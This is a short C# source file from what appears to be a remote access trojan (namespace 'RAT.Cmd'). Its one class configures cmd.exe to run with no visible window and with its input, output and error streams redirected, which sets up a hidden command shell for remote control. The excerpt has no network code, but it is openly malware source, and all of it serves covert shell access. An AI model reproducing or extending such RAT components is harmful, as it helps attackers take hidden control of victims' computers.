using System.Diagnostics;
using System.Text;

namespace RAT.Cmd
{
    /// <summary>
    /// Class contains configuration logic for cmd.
    /// </summary>
    public class CmdConfigurator
    {
        /// <summary>
        /// Gets configuration for cmd startup process.
        /// </summary>
        /// <returns>Process start info for cmd startup.</returns>
        public ProcessStartInfo GetCmdStartupConfiguration()
        {
            return new ProcessStartInfo()
            {
                FileName = "cmd.exe",
                CreateNoWindow = true,
                RedirectStandardOutput = true,
                RedirectStandardInput = true,
                RedirectStandardError = true,
                StandardOutputEncoding = Encoding.ASCII,
            };
        }
    }
}